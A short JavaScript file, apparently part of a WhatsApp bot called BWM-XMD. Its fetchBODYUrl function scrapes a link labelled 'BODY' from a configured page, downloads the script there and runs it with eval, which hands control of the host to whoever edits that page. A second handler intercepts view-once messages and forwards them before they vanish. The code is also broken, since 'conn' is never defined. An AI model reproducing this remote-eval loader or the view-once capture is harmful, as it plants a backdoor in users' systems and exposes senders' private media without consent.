
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");

async function fetchBODYUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("BODY")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchBODYUrl();

conn.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];

    if (!msg.message) return;

    // Check if it's a view-once message
    if (msg.message.viewOnceMessageV2) {
        const viewOnce = msg.message.viewOnceMessageV2.message;

        // Forward the media content before it's deleted
        await conn.sendMessage(msg.key.remoteJid, { forward: msg }, { quoted: msg });

        console.log("View-once message intercepted and forwarded.");
    }

    // You can add other message handling logic below
});

